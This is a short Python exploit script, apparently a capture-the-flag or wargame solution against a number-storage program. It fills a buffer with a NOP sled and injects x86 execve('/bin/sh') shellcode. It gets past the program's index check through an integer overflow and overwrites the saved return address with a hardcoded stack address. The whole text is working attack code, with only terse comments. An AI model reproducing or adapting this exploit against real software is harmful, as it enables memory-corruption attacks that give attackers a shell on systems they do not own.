from __future__ import print_function
import struct

# if idx % 3 then add 1 to the most significant bit so it passes the test but then overflows and write at correct location
def print_idx(idx):
    if idx % 3 == 0:
        print(idx + 0x40000000)
    else:
        print(idx)

j = 0
# pad 0x90 for the rest of the buffer
for i in range(88):
    print("store")
    print(0x90909090)
    print_idx(j)
    j += 1

shellcode = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh\x90\x90\x90"

# insert the shellcode in the memory
for i in range(0, len(shellcode), 4):
    print("store")
    nb, = struct.unpack("<I", shellcode[i:i+4])
    print(nb)
    print_idx(j)
    j += 1

# write over eip
print("store")
print(0xffffd554)
print_idx(114)

print("quit")
